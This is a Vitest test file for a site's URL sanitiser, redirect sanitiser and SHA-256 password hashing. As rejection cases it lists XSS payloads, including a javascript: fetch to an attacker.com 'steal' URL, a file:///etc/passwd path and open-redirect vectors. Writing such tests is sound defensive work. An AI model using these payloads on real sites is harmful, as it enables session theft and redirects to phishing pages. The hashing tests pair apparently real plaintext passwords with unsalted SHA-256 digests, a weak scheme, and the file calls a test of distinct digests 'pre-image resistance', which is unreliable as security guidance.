import { describe, it, expect } from 'vitest';
import {
  sanitizeUrl,
  isSafeUrl,
  sanitizeRedirectPath,
  hashPasswordSha256,
} from '../utils/security';

describe('Security Utilities Suite', () => {
  describe('sanitizeUrl & isSafeUrl', () => {
    it('permits valid HTTPS, HTTP, mailto, and tel schemes', () => {
      const validUrls = [
        'https://github.com/AkashKundu114',
        'https://akashkundu.me/projects',
        'http://localhost:4173',
        'mailto:akashkundu7487@gmail.com',
        'tel:+15551234567',
        '/projects/copper',
        '/certificates',
      ];

      for (const url of validUrls) {
        expect(sanitizeUrl(url)).toBe(url);
        expect(isSafeUrl(url)).toBe(true);
      }
    });

    it('rejects XSS injection payloads with javascript: scheme', () => {
      const xssPayloads = [
        'javascript:alert(1)',
        'JAVASCRIPT:alert(document.cookie)',
        '  javascript:void(0)  ',
        'javascript://%0aalert(1)',
        'java\0script:alert(1)',
        'javascript:fetch("https://attacker.com/steal")',
      ];

      for (const payload of xssPayloads) {
        expect(sanitizeUrl(payload)).toBeUndefined();
        expect(isSafeUrl(payload)).toBe(false);
      }
    });

    it('rejects data:, vbscript:, and file: schemes', () => {
      const dangerousSchemes = [
        'data:text/html,<script>alert(1)</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'vbscript:msgbox("hacked")',
        'file:///etc/passwd',
        'file://C:/Windows/System32/cmd.exe',
        'blob:https://example.com/uuid',
      ];

      for (const scheme of dangerousSchemes) {
        expect(sanitizeUrl(scheme)).toBeUndefined();
        expect(isSafeUrl(scheme)).toBe(false);
      }
    });

    it('rejects protocol-relative and backslash open redirect vectors', () => {
      const openRedirects = [
        '//attacker.com',
        '//google.com/malicious',
        '/\\attacker.com',
        '\\attacker.com',
        '\\\\attacker.com\\share',
      ];

      for (const url of openRedirects) {
        expect(sanitizeUrl(url)).toBeUndefined();
        expect(isSafeUrl(url)).toBe(false);
      }
    });

    it('handles null, undefined, empty, and non-string inputs safely', () => {
      expect(sanitizeUrl(null)).toBeUndefined();
      expect(sanitizeUrl(undefined)).toBeUndefined();
      expect(sanitizeUrl('')).toBeUndefined();
      expect(sanitizeUrl('   ')).toBeUndefined();
      expect(sanitizeUrl(12345 as unknown as string)).toBeUndefined();
    });
  });

  describe('sanitizeRedirectPath', () => {
    it('preserves valid internal paths', () => {
      expect(sanitizeRedirectPath('/projects')).toBe('/projects');
      expect(sanitizeRedirectPath('/certificates/detail')).toBe('/certificates/detail');
      expect(sanitizeRedirectPath('about')).toBe('/about');
    });

    it('neutralizes protocol-relative open redirect attacks', () => {
      expect(sanitizeRedirectPath('//attacker.com')).toBe('/');
      expect(sanitizeRedirectPath('//evil.org/phish')).toBe('/');
    });

    it('neutralizes backslash bypass attempts (CVE-2025-68470)', () => {
      expect(sanitizeRedirectPath('/\\attacker.com')).toBe('/');
      expect(sanitizeRedirectPath('\\\\attacker.com')).toBe('/');
      expect(sanitizeRedirectPath('\\evil.com')).toBe('/');
    });

    it('rejects full URLs with protocols when expecting internal paths', () => {
      expect(sanitizeRedirectPath('https://evil.com')).toBe('/');
      expect(sanitizeRedirectPath('http://malicious.org')).toBe('/');
      expect(sanitizeRedirectPath('javascript:alert(1)')).toBe('/');
    });

    it('returns provided fallback for empty or invalid inputs', () => {
      expect(sanitizeRedirectPath(null, '/home')).toBe('/home');
      expect(sanitizeRedirectPath(undefined, '/projects')).toBe('/projects');
      expect(sanitizeRedirectPath('', '/default')).toBe('/default');
    });
  });

  describe('hashPasswordSha256', () => {
    it('correctly hashes standard test inputs using Web Crypto SHA-256', async () => {
      const hash1 = await hashPasswordSha256('admin2024');
      expect(hash1).toBe('b8b8eb83374c0bf3b1c3224159f6119dbfff1b7ed6dfecdd80d4e8a895790a34');

      const hash2 = await hashPasswordSha256('Gagan1414@');
      expect(hash2).toBe('45cbd2273491a7d411b202c15a0ca20bbc270d3fc838cfd7f363d30e8d5a83be');

      const emptyHash = await hashPasswordSha256('');
      expect(emptyHash).toBe('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855');
    });

    it('produces distinct digests for distinct inputs (pre-image resistance)', async () => {
      const hashA = await hashPasswordSha256('passwordA');
      const hashB = await hashPasswordSha256('passwordB');
      expect(hashA).not.toBe(hashB);
      expect(hashA).toHaveLength(64);
      expect(hashB).toHaveLength(64);
    });
  });
});
